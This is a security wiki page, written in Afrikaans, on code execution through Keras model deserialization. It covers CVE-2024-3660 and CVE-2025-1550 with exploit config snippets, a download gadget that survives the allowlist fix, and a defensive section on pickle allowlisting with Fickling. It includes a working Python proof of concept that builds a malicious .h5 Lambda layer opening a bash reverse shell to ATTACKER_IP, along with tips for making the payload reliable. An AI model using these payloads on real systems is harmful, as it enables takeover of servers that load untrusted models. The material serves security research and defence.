# Keras Model Deserialization RCE en Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Hierdie bladsy som praktiese exploitation-tegnieke teen die Keras-modeldeserialiseringspyplyn op, verduidelik die interne werking en attack surface van die native .keras-formaat, en verskaf ’n researcher toolkit om Model File Vulnerabilities (MFVs) en post-fix gadgets te vind.

## Interne werking van die .keras-modelformaat

’n .keras-lêer is ’n ZIP-argief wat ten minste die volgende bevat:<sup>[[1]](#references)</sup>
- metadata.json – algemene inligting (bv. Keras-weergawe)
- config.json – modelargitektuur (primêre attack surface)
- model.weights.h5 – gewigte in HDF5

Die config.json beheer rekursiewe deserialisering: Keras voer modules in, resolve klasse/funksies en rekonstrueer lae/objekte vanuit dictionaries wat deur die aanvaller beheer word.<sup>[[1]](#references)</sup>

Voorbeeldbrokkie vir ’n Dense-laagobjek:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserialisering voer die volgende uit:<sup>[[1]](#references)</sup>
- Module-import en simboolresolusie vanaf module/class_name-sleutels
- from_config(...) of konstruktor-aanroeping met aanvaller-beheerde kwargs
- Rekursie in geneste objekte (activations, initializers, constraints, ens.)

Histories het dit drie primitiewe aan ’n aanvaller gebied wat config.json saamstel:<sup>[[1]](#references)</sup>
- Beheer oor watter modules geïmporteer word
- Beheer oor watter klasse/funksies opgelos word
- Beheer oor kwargs wat aan konstrukteurs/from_config deurgegee word

## CVE-2024-3660 – Lambda-layer bytecode RCE

Grondoorsaak:
- Lambda.from_config() het python_utils.func_load(...) gebruik, wat base64-dekodeer en marshal.loads() op aanvallerdata aanroep; Python-unmarshalling kan kode uitvoer.<sup>[[1]](#references)[[3]](#references)</sup>

Exploit-idee (vereenvoudigde payload in config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Versagting:
- Keras forseer safe_mode=True by verstek. Serialized Python functions in Lambda word geblokkeer tensy 'n gebruiker uitdruklik met safe_mode=False daarvan afstand doen.<sup>[[1]](#references)</sup>

Notas:
- Legacy formats (ouer HDF5 saves) of ouer codebases forseer moontlik nie moderne checks nie, dus kan “downgrade”-styl attacks steeds van toepassing wees wanneer victims ouer loaders gebruik.

## CVE-2025-1550 – Arbitrary module import in Keras ≤ 3.8

Oorsaak:
- _retrieve_class_or_fn het onbeperkte importlib.import_module() gebruik met attacker-controlled module strings uit config.json.
- Impak: Arbitrary import van enige geïnstalleerde module (of 'n attacker-planted module op sys.path). Import-time code word uitgevoer, waarna object construction met attacker kwargs plaasvind.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Exploit-idee:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Sekuriteitsverbeterings (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Module-allowlist: imports beperk tot amptelike ekosisteemmodules: keras, keras_hub, keras_cv, keras_nlp
- Veilige modus by verstek: safe_mode=True blokkeer die laai van onveilige Lambda-geserialiseerde funksies
- Basiese tipekontrolering: gedeserialiseerde objekte moet met die verwagte tipes ooreenstem

## Praktiese uitbuiting: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Baie production stacks aanvaar steeds legacy TensorFlow-Keras HDF5-modelle (.h5). As ’n aanvaller ’n model kan oplaai wat die bediener later laai of waarop dit inference uitvoer, kan ’n Lambda-laag arbitrêre Python tydens laai/build/predict uitvoer.<sup>[[7]](#references)</sup>

Minimale PoC om ’n kwaadwillige .h5 te skep wat ’n reverse shell uitvoer wanneer dit gedeserialiseer of gebruik word:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Notas en betroubaarheidswenke:
- Snellerpunte: code kan verskeie kere uitgevoer word (bv. tydens layer build/first call, model.load_model en predict/fit). Maak payloads idempotent.<sup>[[7]](#references)</sup>
- Weergawevaspenning: laat die slagoffer se TF/Keras/Python ooreenstem om serialiseringswanpassings te vermy. Bou byvoorbeeld artefakte onder Python 3.8 met TensorFlow 2.13.1 as dit is wat die teiken gebruik.<sup>[[7]](#references)</sup>
- Vinnige omgewingsreplikasie:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Validasie: ’n onskadelike payload soos os.system("ping -c 1 YOUR_IP") help om uitvoering te bevestig (bv. deur ICMP met tcpdump waar te neem) voordat daar na ’n reverse shell oorgeskakel word.<sup>[[7]](#references)</sup>

## Gadget-oppervlak binne allowlist ná regstelling

Selfs met allowlisting en safe mode bly daar ’n breë oppervlak onder toegelate Keras-callables. Byvoorbeeld, keras.utils.get_file kan arbitrêre URL’s na gebruiker-kiesbare liggings aflaai.<sup>[[1]](#references)</sup>

Gadget via Lambda wat na ’n toegelate funksie verwys (nie-geserialiseerde Python-bytecode):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Belangrike beperking:
- Lambda.call() voeg die input tensor as die eerste positional argument by wanneer die target callable aangeroep word. Gekose gadgets moet 'n ekstra positional arg kan hanteer (of *args/**kwargs aanvaar). Dit beperk watter funksies bruikbaar is.<sup>[[1]](#references)</sup>

## ML pickle import allowlisting vir AI/ML-modelle (Fickling)

Baie AI/ML-modelformate (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, ouer TensorFlow artifacts, ens.) bevat Python pickle-data. Attackers misbruik gereeld pickle GLOBAL imports en object constructors om RCE of model swapping tydens laai te bewerkstellig. Blacklist-gebaseerde scanners mis dikwels nuwe of ongelyste gevaarlike imports.<sup>[[8]](#references)[[14]](#references)</sup>

'n Praktiese fail-closed verdediging is om Python se pickle deserializer te hook en slegs 'n nagegane stel harmless ML-related imports tydens unpickling toe te laat. Trail of Bits se Fickling implementeer hierdie beleid en verskaf 'n curated ML import allowlist wat uit duisende publieke Hugging Face pickles saamgestel is.<sup>[[8]](#references)[[13]](#references)</sup>

Security model vir “safe” imports (insigte uit research en praktyk gedistilleer): imported symbols wat deur 'n pickle gebruik word, moet gelyktydig:<sup>[[8]](#references)</sup>
- Nie code uitvoer of uitvoering veroorsaak nie (geen compiled/source code objects, shelling out, hooks, ens. nie)
- Nie arbitrêre attributes of items kry of stel nie
- Nie imports uitvoer of references na ander Python objects uit die pickle VM verkry nie
- Geen secondary deserializers (bv. marshal, nested pickle) trigger nie, selfs nie indirek nie

Enable Fickling se protections so vroeg as moontlik tydens process startup sodat enige pickle loads wat deur frameworks (torch.load, joblib.load, ens.) uitgevoer word, nagegaan word:<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Operasionele wenke:
- Jy kan die hooks tydelik deaktiveer/heraktiveer waar nodig:<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- As 'n model wat as veilig bekend is geblokkeer word, brei die allowlist vir jou omgewing uit nadat jy die symbols nagegaan het:<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling stel ook generiese runtime guards beskikbaar indien jy meer granular control verkies:<sup>[[9]](#references)</sup>
- `fickling.always_check_safety()` om checks vir alle `pickle.load()` af te dwing
- `with fickling.check_safety():` vir scoped enforcement
- `fickling.load(path)` / `fickling.is_likely_safe(path)` vir eenmalige checks

- Verkies non-pickle model formats waar moontlik (bv. SafeTensors).<sup>[[15]](#references)</sup> Indien jy pickle moet aanvaar, run loaders met least privilege, sonder network egress, en dwing die allowlist af.

Hierdie allowlist-first strategy blokkeer common ML pickle exploit paths aantoonbaar, terwyl dit compatibility hoog hou. In ToB se benchmark het Fickling 100% van synthetic malicious files geflag en ongeveer 99% van clean files van top Hugging Face repos toegelaat.<sup>[[8]](#references)[[10]](#references)</sup>


## Navorsingsgereedskapstel

1) Systematic gadget discovery in toegelate modules

Enumerate candidate callables oor keras, keras_nlp, keras_cv, keras_hub en prioritiseer dié met file/network/process/env side effects.<sup>[[1]](#references)</sup>

<details>
<summary>Enumerate potensieel gevaarlike callables in allowlisted Keras modules</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Direkte deserialiseringstoetsing (geen .keras-argief nodig nie)

Voer vervaardigde dicts direk aan Keras-deserialiseerders, om aanvaarbare params te leer en newe-effekte waar te neem.<sup>[[1]](#references)</sup>
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Kruisweergawes en formate

Keras bestaan in verskeie codebases/eras met verskillende guardrails en formate:<sup>[[1]](#references)</sup>
- TensorFlow ingeboude Keras: tensorflow/python/keras (legacy, beplan vir verwydering)
- tf-keras: word apart onderhou
- Multi-backend Keras 3 (amptelik): het native .keras bekendgestel

Herhaal toetse oor codebases en formate (.keras teenoor legacy HDF5) om regressies of ontbrekende guardrails te identifiseer.

## Verwysings

- [1] [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Kontroles by serialisering gevoeg](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail of Bits blog – Fickling se nuwe AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
